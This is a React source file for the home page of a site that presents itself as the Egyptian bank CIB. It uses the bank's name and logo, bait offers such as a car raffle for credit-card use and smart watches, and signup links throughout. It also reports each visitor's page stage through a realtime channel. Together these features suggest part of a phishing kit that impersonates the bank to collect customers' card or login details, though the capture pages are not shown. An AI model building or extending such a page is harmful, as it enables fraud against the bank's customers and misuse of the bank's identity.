import { useEffect } from 'react';
import { Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { useRealtime } from '@/context/RealtimeContext';
import { 
  Shield, 
  Clock, 
  Users, 
  Car, 
  PiggyBank, 
  Wallet, 
  Lock, 
  Zap, 
  Gift, 
  Headphones, 
  ShieldCheck, 
  Sparkles, 
  Star, 
  ArrowLeft,
  ArrowRight,
  Watch
} from 'lucide-react';

const EMPTY_PAYLOAD = {};

export default function Home() {
  const { reportStage } = useRealtime();

  useEffect(() => {
    reportStage('home', EMPTY_PAYLOAD);
  }, [reportStage]);

  const services = [
    {
      icon: Car,
      title: 'سحب على سيارة',
      desc: 'استخدم بطاقتك الائتمانية من CIB وادخل السحب على سيارة أحلامك! فرصتك للربح بكل عملية شراء.',
      button: 'سجل الآن',
      tag: 'عرض حصري',
      image: 'https://images.unsplash.com/photo-1617814076367-b759c7d7e738?auto=format&fit=crop&w=600&q=80'
    },
    {
      icon: Wallet,
      title: 'حلول تمويل',
      desc: 'خيارات تمويل مرنة وإجراءات ميسرة للعملاء المؤهلين — املك منزل أحلامك أو سيارتك بسهولة.',
      button: 'قدّم طلبك',
      tag: 'تمويل سريع',
      image: 'https://images.unsplash.com/photo-1565514020179-026b92b84bb6?auto=format&fit=crop&w=600&q=80'
    },
    {
      icon: PiggyBank,
      title: 'شهادات الاستثمار',
      desc: 'استثمر بثقة مع حلول ادخارية تناسب أهدافك المالية واستمتع بعوائد تنافسية ومدد متنوعة.',
      button: 'اعرف المزيد',
      tag: 'عائد ثابت',
      image: 'https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?auto=format&fit=crop&w=600&q=80'
    },
  ];

  const features = [
    {
      icon: Lock,
      title: 'حماية بنكية متقدمة',
      desc: 'تشفير من الدرجة المصرفية لجميع بياناتك ومعاملاتك على مدار الساعة.',
    },
    {
      icon: Zap,
      title: 'تجربة فائقة السرعة',
      desc: 'تنفيذ معاملاتك في ثوانٍ مع واجهة استخدام سهلة وحديثة.',
    },
    {
      icon: Gift,
      title: 'عروض حصرية',
      desc: 'هدايا وعروض محدودة لعملاء CIB المميزين فقط.',
    },
    {
      icon: Headphones,
      title: 'دعم 24/7',
      desc: 'فريق دعم متخصص متاح دائماً للإجابة عن استفساراتك.',
    },
  ];

  return (
    <AppLayout>
      <div className="w-full flex flex-col items-center justify-start flex-1 animate-in fade-in duration-500" dir="rtl">
        
        {/* Hero Section المطابق تماماً للصورة */}
        <div className="relative w-full bg-gradient-to-b from-[#0e5fa3] via-[#094285] to-[#042656] pt-16 pb-32 flex flex-col items-center text-center overflow-hidden">
          
          {/* خلفية منقطة خفيفة وتوهج دائري */}
          <div className="absolute inset-0 bg-[radial-gradient(#ffffff08_1px,transparent_1px)] [background-size:16px_16px] opacity-60"></div>
          <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[500px] h-[500px] bg-blue-500/10 rounded-full blur-3xl pointer-events-none"></div>

          <div className="container mx-auto px-4 relative z-10 flex flex-col items-center max-w-3xl">
            
            {/* دائرة الشعار الوسطية الكبيرة */}
            <div className="w-36 h-36 bg-white rounded-full shadow-[0_0_30px_rgba(255,255,255,0.15)] p-4 flex items-center justify-center mb-10 border-4 border-white/10 animate-in zoom-in-75 duration-500">
              <div className="text-[#0a4fa3] font-black text-4xl tracking-tighter flex items-center gap-1">
                <span className="border-2 border-[#0a4fa3] rounded-full p-1.5 text-lg leading-none font-bold">CIB</span>
                <span>IB</span>
              </div>
            </div>

            {/* التاج/العلامة البرتقالية العلوية */}
            <div className="inline-flex items-center gap-2 bg-white/10 border border-white/20 px-5 py-2 rounded-full mb-6 animate-in fade-in slide-in-from-top-3 duration-500">
              <Sparkles className="w-4 h-4 text-[#f08519]" />
              <span className="text-sm font-bold text-[#f08519]">مرحباً بك في تجربة بنكية جديدة</span>
            </div>
            
            {/* العناوين الرئيسية الملونة */}
            <h1 className="text-4xl md:text-5xl font-black text-white mb-3 tracking-wide leading-tight">
              البنك التجاري الدولي
            </h1>
            <h2 className="text-3xl md:text-4xl font-extrabold text-[#f08519] mb-6">
              CIB Egypt
            </h2>
            
            {/* الوصف */}
            <p className="text-base md:text-lg text-blue-100/90 mb-10 max-w-xl leading-relaxed font-normal">
              خدماتك المصرفية بين يديك — أمان، سرعة وثقة في كل معاملة
            </p>
            
            {/* أزرار التحكم المتطابقة */}
            <div className="flex flex-col gap-4 w-full max-w-xs sm:max-w-md items-center justify-center">
              <Link 
                href="/signup"
                className="inline-flex items-center justify-center gap-2 bg-white/10 backdrop-blur-sm border border-white/30 text-white font-bold py-4 px-12 rounded-full text-lg w-full sm:w-80 transition-all hover:bg-white/20 shadow-md group"
              >
                <ArrowRight className="w-5 h-5 transition-transform group-hover:-translate-x-1" />
                <span>استكشف الخدمات</span>
              </Link>
              
              <Link 
                href="/watches"
                className="inline-flex items-center justify-center gap-2 bg-[#f08519] hover:bg-[#d6720f] text-white font-bold py-4 px-12 rounded-full text-lg w-full sm:w-80 transition-all shadow-lg shadow-orange-900/20"
              >
                <Watch className="w-5 h-5" />
                <span>عرض الساعات الذكية</span>
              </Link>
            </div>
          </div>

          {/* المنحنى الدائري السفلي الأبيض المتناسق (Wave curve effect) */}
          <div className="absolute bottom-0 left-0 right-0 w-full overflow-hidden leading-none transform translate-y-1">
            <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="relative block w-full h-[60px] fill-white">
              <path d="M0,0 C300,90 900,90 1200,0 L1200,120 L0,120 Z"></path>
            </svg>
          </div>
        </div>

        {/* Stats */}
        <div className="w-full max-w-5xl mx-auto px-4 -mt-12 relative z-20">
          <div className="bg-white rounded-[2rem] p-6 shadow-xl border border-slate-100 grid grid-cols-1 md:grid-cols-3 gap-6 md:divide-x md:divide-x-reverse divide-slate-100">
            <div className="flex flex-col items-center justify-center text-center py-2">
              <div className="w-14 h-14 bg-[#f0f5fa] text-[#0b53a7] rounded-full flex items-center justify-center mb-3">
                <Shield className="w-6 h-6" />
              </div>
              <span className="text-lg font-bold text-slate-800 tracking-wide">100% حماية</span>
            </div>
            <div className="flex flex-col items-center justify-center text-center py-2">
              <div className="w-14 h-14 bg-[#f0f5fa] text-[#0b53a7] rounded-full flex items-center justify-center mb-3">
                <Users className="w-6 h-6" />
              </div>
              <span className="text-lg font-bold text-slate-800 tracking-wide">+2 مليون عميل</span>
            </div>
            <div className="flex flex-col items-center justify-center text-center py-2">
              <div className="w-14 h-14 bg-[#f0f5fa] text-[#0b53a7] rounded-full flex items-center justify-center mb-3">
                <Clock className="w-6 h-6" />
              </div>
              <span className="text-lg font-bold text-slate-800 tracking-wide">24/7 خدمة فورية</span>
            </div>
          </div>
        </div>

        {/* Services */}
        <div className="w-full max-w-5xl mx-auto px-4 py-16" id="services">
          <div className="text-center mb-10">
            <div className="inline-flex items-center gap-1.5 bg-[#f0f5fa] text-[#0b53a7] px-4 py-1.5 rounded-full text-xs font-bold mb-3 shadow-sm">
              <Sparkles className="w-3.5 h-3.5" />
              <span>خدماتنا</span>
            </div>
            <h2 className="text-2xl md:text-3xl font-black text-slate-900 mb-2 tracking-wide">
              اختر الخدمة المناسبة لك
            </h2>
            <p className="text-sm text-slate-500 font-medium">
              خدمات مصرفية متنوعة مصممة خصيصاً لراحتك
            </p>
            <div className="flex justify-center gap-1.5 mt-4">
              <span className="w-6 h-1.5 bg-[#0b53a7] rounded-full"></span>
              <span className="w-2 h-1.5 bg-slate-300 rounded-full"></span>
              <span className="w-2 h-1.5 bg-slate-300 rounded-full"></span>
            </div>
          </div>
          
          <div className="w-full max-w-xl mx-auto space-y-8">
            {services.map((service, idx) => (
              <div 
                key={idx}
                className="bg-white rounded-[2rem] overflow-hidden shadow-md border border-slate-100 p-5 flex flex-col items-center text-center"
              >
                <div className="w-full relative rounded-2xl overflow-hidden mb-5">
                  <span className="absolute top-3 right-3 bg-[#ea8c23] text-white text-[11px] font-bold px-3 py-1 rounded-lg z-10 flex items-center gap-1 shadow-sm">
                    <Star className="w-3 h-3 fill-white" /> {service.tag}
                  </span>
                  <img 
                    src={service.image} 
                    alt={service.title} 
                    className="w-full h-52 object-cover"
                  />
                </div>
                <h3 className="text-xl font-bold text-slate-900 mb-2">{service.title}</h3>
                <p className="text-sm text-slate-500 leading-relaxed mb-6 px-4 font-light">
                  {service.desc}
                </p>
                <Link 
                  href="/signup"
                  className="flex items-center justify-center gap-2 bg-[#0b53a7] hover:bg-[#073771] text-white font-bold py-3.5 w-full rounded-2xl text-sm transition-all shadow-sm"
                >
                  <span>{service.button}</span>
                  <ArrowLeft className="w-4 h-4" />
                </Link>
              </div>
            ))}
          </div>
        </div>

        {/* Why Us */}
        <div className="w-full bg-gradient-to-br from-gray-50 to-blue-50 py-20">
          <div className="w-full max-w-6xl mx-auto px-4">
            <div className="text-center mb-12">
              <h2 className="text-3xl md:text-4xl font-extrabold text-foreground mb-4">
                ثقة لا تتزعزع
              </h2>
              <p className="text-lg text-muted-foreground">
                أكثر من 50 عاماً من الخبرة في تقديم أفضل الخدمات المصرفية
              </p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
              {features.map((feature, idx) => (
                <div 
                  key={idx}
                  className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 hover:shadow-lg transition-all duration-300 group"
                >
                  <div className="w-14 h-14 bg-gradient-to-br from-[#0a4fa3] to-[#073a7a] rounded-xl flex items-center justify-center mb-4 group-hover:scale-110 transition-transform duration-300">
                    <feature.icon className="w-7 h-7 text-white" />
                  </div>
                  <h3 className="text-lg font-bold text-foreground mb-2">{feature.title}</h3>
                  <p className="text-sm text-gray-500 leading-relaxed">{feature.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* CTA */}
        <div className="w-full bg-gradient-to-br from-[#0c59b3] via-[#0a4fa3] to-[#073a7a] py-20">
          <div className="w-full max-w-4xl mx-auto px-4 text-center">
            <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm px-4 py-2 rounded-full mb-6">
              <ShieldCheck className="w-5 h-5 text-green-400" />
              <span className="text-sm font-semibold text-white">جاهز للبدء؟</span>
            </div>
            <h2 className="text-3xl md:text-4xl font-extrabold text-white mb-4">
              افتح حسابك في ثوانٍ
            </h2>
            <p className="text-lg text-blue-100 mb-8 max-w-2xl mx-auto">
              انضم إلى ملايين العملاء الذين يثقون في CIB لإدارة حياتهم المالية.
            </p>
            <Link 
              href="/signup"
              className="inline-flex items-center justify-center gap-2 bg-white text-[#0a4fa3] px-10 py-4 rounded-xl font-bold text-lg hover:bg-blue-50 transition-all duration-300 hover:scale-105 shadow-xl"
            >
              <span>ابدأ الآن</span>
              <ArrowLeft className="w-5 h-5" />
            </Link>
          </div>
        </div>

      </div>
    </AppLayout>
  );
}
